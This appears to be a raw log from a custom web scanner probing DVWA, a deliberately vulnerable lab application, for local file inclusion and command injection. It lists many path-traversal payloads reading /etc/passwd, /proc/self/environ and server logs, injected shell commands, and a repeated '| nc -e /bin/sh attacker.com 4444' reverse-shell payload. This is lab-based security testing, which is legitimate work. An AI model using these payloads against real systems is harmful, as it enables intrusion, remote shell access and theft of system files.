+[LFI] [-] No LFI vulnerability at http://10.0.2.4/vulnerabilities/fi/?page=include.php&page=../../../../etc/passwd
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/vulnerabilities/fi/?page=include.php&page=../../../../../../../../etc/passwd
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/vulnerabilities/fi/?page=include.php&page=/etc/passwd
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/vulnerabilities/fi/?page=include.php&page=../../../../../../../../windows/system32/drivers/etc/hosts
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/vulnerabilities/fi/?page=include.php&page=../../../../windows/win.ini
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/vulnerabilities/fi/?page=include.php&page=../../boot.ini
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/vulnerabilities/fi/?page=include.php&page=/proc/self/environ
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/vulnerabilities/fi/?page=include.php&page=../../../../../../../../proc/self/environ
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/vulnerabilities/fi/?page=include.php&page=../../../../../../../../var/log/apache2/access.log
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/vulnerabilities/fi/?page=include.php&page=../../../../../../../../var/log/httpd/access_log
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/vulnerabilities/fi/?page=include.php&page=../../../../../../../../var/log/httpd/error_log
+[LFI] [-] No parameters found in http://10.0.2.4/vulnerabilities/csp
+[LFI] [-] No parameters found in http://10.0.2.4/vulnerabilities/xss_d
+[LFI] [+] LFI vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=PDF&doc=../../../../etc/passwd
+[LFI] [+] LFI vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=PDF&doc=../../../../../../../../etc/passwd
+[LFI] [+] LFI vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=PDF&doc=/etc/passwd
+[LFI] [+] LFI vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=PDF&doc=../../../../../../../../windows/system32/drivers/etc/hosts
+[LFI] [+] LFI vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=PDF&doc=../../../../windows/win.ini
+[LFI] [+] LFI vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=PDF&doc=../../boot.ini
+[LFI] [+] LFI vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=PDF&doc=/proc/self/environ
+[LFI] [+] LFI vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=PDF&doc=../../../../../../../../proc/self/environ
+[LFI] [+] LFI vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=PDF&doc=../../../../../../../../var/log/apache2/access.log
+[LFI] [+] LFI vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=PDF&doc=../../../../../../../../var/log/httpd/access_log
+[LFI] [+] LFI vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=PDF&doc=../../../../../../../../var/log/httpd/error_log
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=2&redirect=../../../../etc/passwd
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=2&redirect=../../../../../../../../etc/passwd
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=2&redirect=/etc/passwd
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=2&redirect=../../../../../../../../windows/system32/drivers/etc/hosts
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=2&redirect=../../../../windows/win.ini
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=2&redirect=../../boot.ini
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=2&redirect=/proc/self/environ
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=2&redirect=../../../../../../../../proc/self/environ
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=2&redirect=../../../../../../../../var/log/apache2/access.log
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=2&redirect=../../../../../../../../var/log/httpd/access_log
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=2&redirect=../../../../../../../../var/log/httpd/error_log
+[LFI] [-] No parameters found in http://10.0.2.4/security.php
+[LFI] [-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/xss_d
+[LFI] [-] No parameters found in http://10.0.2.4/DVWA/README.tr.md
+[LFI] [-] No parameters found in http://10.0.2.4/DVWA/compose.yml
+[LFI] [-] No parameters found in http://10.0.2.4/DVWA/README.pl.md
+[LFI] [-] No parameters found in http://10.0.2.4/DVWA/config/config.inc.php.dist
+[LFI] [-] No parameters found in http://10.0.2.4
+[LFI] [-] No parameters found in http://10.0.2.4/manual
+[LFI] [+] LFI vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=changelog&doc=../../../../etc/passwd
+[LFI] [+] LFI vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=changelog&doc=../../../../../../../../etc/passwd
+[LFI] [+] LFI vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=changelog&doc=/etc/passwd
+[LFI] [+] LFI vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=changelog&doc=../../../../../../../../windows/system32/drivers/etc/hosts
+[LFI] [+] LFI vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=changelog&doc=../../../../windows/win.ini
+[LFI] [+] LFI vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=changelog&doc=../../boot.ini
+[LFI] [+] LFI vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=changelog&doc=/proc/self/environ
+[LFI] [+] LFI vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=changelog&doc=../../../../../../../../proc/self/environ
+[LFI] [+] LFI vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=changelog&doc=../../../../../../../../var/log/apache2/access.log
+[LFI] [+] LFI vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=changelog&doc=../../../../../../../../var/log/httpd/access_log
+[LFI] [+] LFI vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=changelog&doc=../../../../../../../../var/log/httpd/error_log
+[LFI] [-] No parameters found in http://10.0.2.4/DVWA/README.vi.md
+[LFI] [-] No parameters found in http://10.0.2.4/vulnerabilities/authbypass
+[LFI] [-] No parameters found in http://10.0.2.4/vulnerabilities/cryptography
+[LFI] [-] No parameters found in http://10.0.2.4/DVWA/instructions.php
+[LFI] [-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/xss_s
+[LFI] [-] No parameters found in http://10.0.2.4/DVWA/about.php
+[LFI] [-] No parameters found in http://10.0.2.4/about.php
+[LFI] [+] LFI vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=copying&doc=../../../../etc/passwd
+[LFI] [+] LFI vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=copying&doc=../../../../../../../../etc/passwd
+[LFI] [+] LFI vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=copying&doc=/etc/passwd
+[LFI] [+] LFI vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=copying&doc=../../../../../../../../windows/system32/drivers/etc/hosts
+[LFI] [+] LFI vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=copying&doc=../../../../windows/win.ini
+[LFI] [+] LFI vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=copying&doc=../../boot.ini
+[LFI] [+] LFI vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=copying&doc=/proc/self/environ
+[LFI] [+] LFI vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=copying&doc=../../../../../../../../proc/self/environ
+[LFI] [+] LFI vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=copying&doc=../../../../../../../../var/log/apache2/access.log
+[LFI] [+] LFI vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=copying&doc=../../../../../../../../var/log/httpd/access_log
+[LFI] [+] LFI vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=copying&doc=../../../../../../../../var/log/httpd/error_log
+[LFI] [-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/sqli
+[LFI] [-] No parameters found in http://10.0.2.4/vulnerabilities/brute
+[LFI] [-] No parameters found in http://10.0.2.4/vulnerabilities/sqli_blind
+[LFI] [-] No parameters found in http://10.0.2.4/DVWA/phpinfo.php
+[LFI] [-] No parameters found in http://10.0.2.4/phpinfo.php
+[LFI] [-] No parameters found in http://10.0.2.4/DVWA/docs/DVWA_v1.3.pdf
+[LFI] [-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/exec
+[LFI] [-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/csrf
+[LFI] [-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/captcha
+[LFI] [-] No parameters found in http://10.0.2.4/DVWA/security.php
+[LFI] [-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/csp
+[LFI] [-] No parameters found in http://10.0.2.4/DVWA/setup.php
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file1.php&page=../../../../etc/passwd
+[LFI] [+] LFI vulnerability found at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file1.php&page=../../../../../../../../etc/passwd
+[LFI] [+] LFI vulnerability found at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file1.php&page=/etc/passwd
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file1.php&page=../../../../../../../../windows/system32/drivers/etc/hosts
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file1.php&page=../../../../windows/win.ini
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file1.php&page=../../boot.ini
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file1.php&page=/proc/self/environ
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file1.php&page=../../../../../../../../proc/self/environ
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file1.php&page=../../../../../../../../var/log/apache2/access.log
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file1.php&page=../../../../../../../../var/log/httpd/access_log
+[LFI] [-] No LFI vulnerability at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file1.php&page=../../../../../../../../var/log/httpd/error_log
+[LFI] [+] LFI vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=readme&doc=../../../../etc/passwd
+[LFI] [+] LFI vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=readme&doc=../../../../../../../../etc/passwd
+[LFI] [+] LFI vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=readme&doc=/etc/passwd
+[LFI] [+] LFI vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=readme&doc=../../../../../../../../windows/system32/drivers/etc/hosts
+[LFI] [+] LFI vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=readme&doc=../../../../windows/win.ini
+[LFI] [+] LFI vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=readme&doc=../../boot.ini
+[LFI] [+] LFI vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=readme&doc=/proc/self/environ
+[LFI] [+] LFI vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=readme&doc=../../../../../../../../proc/self/environ
+[LFI] [+] LFI vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=readme&doc=../../../../../../../../var/log/apache2/access.log
+[LFI] [+] LFI vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=readme&doc=../../../../../../../../var/log/httpd/access_log
+[LFI] [+] LFI vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=readme&doc=../../../../../../../../var/log/httpd/error_log
+[LFI] [-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/open_redirect
+[LFI] [-] No parameters found in http://10.0.2.4/DVWA/README.fa.md
+[LFI] [-] No parameters found in http://10.0.2.4/vulnerabilities/xss_r
+[CMD] [-] No parameters found in http://10.0.2.4/DVWA/README.ko.md
+[CMD] [-] No parameters found in http://10.0.2.4/vulnerabilities/sqli
+[CMD] [-] No parameters found in http://10.0.2.4/vulnerabilities/csrf
+[CMD] [-] No parameters found in http://10.0.2.4/vulnerabilities/xss_s
+[CMD] [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=1&redirect=1; uname -a
+[CMD] [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=1&redirect=1 && cat /etc/passwd
+[CMD] [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=1&redirect=1 || ls -la
+[CMD] [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=1&redirect=1 | whoami
+[CMD] [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=1&redirect=$(whoami)
+[CMD] [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=1&redirect=`id`
+[CMD] [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=1&redirect=1 && sleep 10
+[CMD] [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=1&redirect=1; echo Vulnerable
+[CMD] [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=1&redirect=| nc -e /bin/sh attacker.com 4444
+[CMD] [-] No parameters found in http://10.0.2.4/DVWA/README.zh.md
+[CMD] [-] No parameters found in http://10.0.2.4/DVWA
+[CMD] [-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/javascript
+[CMD] [-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/weak_id
+[CMD] [-] No parameters found in http://10.0.2.4/DVWA/README.es.md
+[CMD] [-] No parameters found in http://10.0.2.4/vulnerabilities/captcha
+[CMD] [-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/upload
+[CMD] [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file3.php&page=1; uname -a
+[CMD] [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file3.php&page=1 && cat /etc/passwd
+[CMD] [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file3.php&page=1 || ls -la
+[CMD] [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file3.php&page=1 | whoami
+[CMD] [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file3.php&page=$(whoami)
+[CMD] [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file3.php&page=`id`
+[CMD] [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file3.php&page=1 && sleep 10
+[CMD] [+] Command Injection vulnerability found at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file3.php&page=1; echo Vulnerable
+[CMD] [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file3.php&page=| nc -e /bin/sh attacker.com 4444
+[CMD] [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=include.php&page=1; uname -a
+[CMD] [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=include.php&page=1 && cat /etc/passwd
+[CMD] [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=include.php&page=1 || ls -la
+[CMD] [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=include.php&page=1 | whoami
+[CMD] [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=include.php&page=$(whoami)
+[CMD] [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=include.php&page=`id`
+[CMD] [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=include.php&page=1 && sleep 10
+[CMD] [+] Command Injection vulnerability found at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=include.php&page=1; echo Vulnerable
+[CMD] [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=include.php&page=| nc -e /bin/sh attacker.com 4444
+[CMD] [-] No parameters found in http://10.0.2.4/DVWA/README.ar.md
+[CMD] [-] No parameters found in http://10.0.2.4/vulnerabilities/upload
+[CMD] [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file2.php&page=1; uname -a
+[CMD] [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file2.php&page=1 && cat /etc/passwd
+[CMD] [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file2.php&page=1 || ls -la
+[CMD] [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file2.php&page=1 | whoami
+[CMD] [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file2.php&page=$(whoami)
+[CMD] [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file2.php&page=`id`
+[CMD] [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file2.php&page=1 && sleep 10
+[CMD] [+] Command Injection vulnerability found at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file2.php&page=1; echo Vulnerable
+[CMD] [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file2.php&page=| nc -e /bin/sh attacker.com 4444
+[CMD] [-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/brute
+[CMD] [-] No parameters found in http://10.0.2.4/vulnerabilities/javascript
+[CMD] [-] No parameters found in http://10.0.2.4/vulnerabilities/open_redirect
+[CMD] [-] No parameters found in http://10.0.2.4/vulnerabilities/weak_id
+[CMD] [-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/authbypass
+[CMD] [-] No parameters found in http://10.0.2.4/vulnerabilities/exec
+[CMD] [-] No parameters found in http://10.0.2.4/DVWA/README.pt.md
+[CMD] [-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/sqli_blind
+[CMD] [-] No parameters found in http://10.0.2.4/instructions.php
+[CMD] [-] No parameters found in http://10.0.2.4/DVWA/README.fr.md
+[CMD] [-] No parameters found in http://10.0.2.4/DVWA/README.id.md
+[CMD] [-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/cryptography
+[CMD] [-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/xss_r
+[CMD] [-] No parameters found in http://10.0.2.4/setup.php
+[CMD] [-] No Command Injection at http://10.0.2.4/vulnerabilities/fi/?page=include.php&page=1; uname -a
+[CMD] [-] No Command Injection at http://10.0.2.4/vulnerabilities/fi/?page=include.php&page=1 && cat /etc/passwd
+[CMD] [-] No Command Injection at http://10.0.2.4/vulnerabilities/fi/?page=include.php&page=1 || ls -la
+[CMD] [-] No Command Injection at http://10.0.2.4/vulnerabilities/fi/?page=include.php&page=1 | whoami
+[CMD] [-] No Command Injection at http://10.0.2.4/vulnerabilities/fi/?page=include.php&page=$(whoami)
+[CMD] [-] No Command Injection at http://10.0.2.4/vulnerabilities/fi/?page=include.php&page=`id`
+[CMD] [-] No Command Injection at http://10.0.2.4/vulnerabilities/fi/?page=include.php&page=1 && sleep 10
+[CMD] [-] No Command Injection at http://10.0.2.4/vulnerabilities/fi/?page=include.php&page=1; echo Vulnerable
+[CMD] [-] No Command Injection at http://10.0.2.4/vulnerabilities/fi/?page=include.php&page=| nc -e /bin/sh attacker.com 4444
+[CMD] [-] No parameters found in http://10.0.2.4/vulnerabilities/csp
+[CMD] [-] No parameters found in http://10.0.2.4/vulnerabilities/xss_d
+[CMD] [+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=PDF&doc=1; uname -a
+[CMD] [+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=PDF&doc=1 && cat /etc/passwd
+[CMD] [+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=PDF&doc=1 || ls -la
+[CMD] [+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=PDF&doc=1 | whoami
+[CMD] [+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=PDF&doc=$(whoami)
+[CMD] [+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=PDF&doc=`id`
+[CMD] [+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=PDF&doc=1 && sleep 10
+[CMD] [+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=PDF&doc=1; echo Vulnerable
+[CMD] [+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=PDF&doc=| nc -e /bin/sh attacker.com 4444
+[CMD] [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=2&redirect=1; uname -a
+[CMD] [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=2&redirect=1 && cat /etc/passwd
+[CMD] [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=2&redirect=1 || ls -la
+[CMD] [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=2&redirect=1 | whoami
+[CMD] [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=2&redirect=$(whoami)
+[CMD] [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=2&redirect=`id`
+[CMD] [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=2&redirect=1 && sleep 10
+[CMD] [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=2&redirect=1; echo Vulnerable
+[CMD] [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=2&redirect=| nc -e /bin/sh attacker.com 4444
+[CMD] [-] No parameters found in http://10.0.2.4/security.php
+[CMD] [-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/xss_d
+[CMD] [-] No parameters found in http://10.0.2.4/DVWA/README.tr.md
+[CMD] [-] No parameters found in http://10.0.2.4/DVWA/compose.yml
+[CMD] [-] No parameters found in http://10.0.2.4/DVWA/README.pl.md
+[CMD] [-] No parameters found in http://10.0.2.4/DVWA/config/config.inc.php.dist
+[CMD] [-] No parameters found in http://10.0.2.4
+[CMD] [-] No parameters found in http://10.0.2.4/manual
+[CMD] [+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=changelog&doc=1; uname -a
+[CMD] [+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=changelog&doc=1 && cat /etc/passwd
+[CMD] [+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=changelog&doc=1 || ls -la
+[CMD] [+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=changelog&doc=1 | whoami
+[CMD] [+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=changelog&doc=$(whoami)
+[CMD] [+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=changelog&doc=`id`
+[CMD] [+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=changelog&doc=1 && sleep 10
+[CMD] [+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=changelog&doc=1; echo Vulnerable
+[CMD] [+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=changelog&doc=| nc -e /bin/sh attacker.com 4444
+[CMD] [-] No parameters found in http://10.0.2.4/DVWA/README.vi.md
+[CMD] [-] No parameters found in http://10.0.2.4/vulnerabilities/authbypass
+[CMD] [-] No parameters found in http://10.0.2.4/vulnerabilities/cryptography
+[CMD] [-] No parameters found in http://10.0.2.4/DVWA/instructions.php
+[CMD] [-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/xss_s
+[CMD] [-] No parameters found in http://10.0.2.4/DVWA/about.php
+[CMD] [-] No parameters found in http://10.0.2.4/about.php
+[CMD] [+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=copying&doc=1; uname -a
+[CMD] [+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=copying&doc=1 && cat /etc/passwd
+[CMD] [+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=copying&doc=1 || ls -la
+[CMD] [+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=copying&doc=1 | whoami
+[CMD] [+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=copying&doc=$(whoami)
+[CMD] [+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=copying&doc=`id`
+[CMD] [+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=copying&doc=1 && sleep 10
+[CMD] [+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=copying&doc=1; echo Vulnerable
+[CMD] [+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=copying&doc=| nc -e /bin/sh attacker.com 4444
+[CMD] [-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/sqli
+[CMD] [-] No parameters found in http://10.0.2.4/vulnerabilities/brute
+[CMD] [-] No parameters found in http://10.0.2.4/vulnerabilities/sqli_blind
+[CMD] [-] No parameters found in http://10.0.2.4/DVWA/phpinfo.php
+[CMD] [-] No parameters found in http://10.0.2.4/phpinfo.php
+[CMD] [-] No parameters found in http://10.0.2.4/DVWA/docs/DVWA_v1.3.pdf
+[CMD] [-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/exec
+[CMD] [-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/csrf
+[CMD] [-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/captcha
+[CMD] [-] No parameters found in http://10.0.2.4/DVWA/security.php
+[CMD] [-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/csp
+[CMD] [-] No parameters found in http://10.0.2.4/DVWA/setup.php
+[CMD] [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file1.php&page=1; uname -a
+[CMD] [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file1.php&page=1 && cat /etc/passwd
+[CMD] [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file1.php&page=1 || ls -la
+[CMD] [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file1.php&page=1 | whoami
+[CMD] [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file1.php&page=$(whoami)
+[CMD] [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file1.php&page=`id`
+[CMD] [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file1.php&page=1 && sleep 10
+[CMD] [+] Command Injection vulnerability found at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file1.php&page=1; echo Vulnerable
+[CMD] [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file1.php&page=| nc -e /bin/sh attacker.com 4444
+[CMD] [+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=readme&doc=1; uname -a
+[CMD] [+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=readme&doc=1 && cat /etc/passwd
+[CMD] [+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=readme&doc=1 || ls -la
+[CMD] [+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=readme&doc=1 | whoami
+[CMD] [+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=readme&doc=$(whoami)
+[CMD] [+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=readme&doc=`id`
+[CMD] [+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=readme&doc=1 && sleep 10
+[CMD] [+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=readme&doc=1; echo Vulnerable
+[CMD] [+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=readme&doc=| nc -e /bin/sh attacker.com 4444
+[CMD] [-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/open_redirect
+[CMD] [-] No parameters found in http://10.0.2.4/DVWA/README.fa.md
+[CMD] [-] No parameters found in http://10.0.2.4/vulnerabilities/xss_r
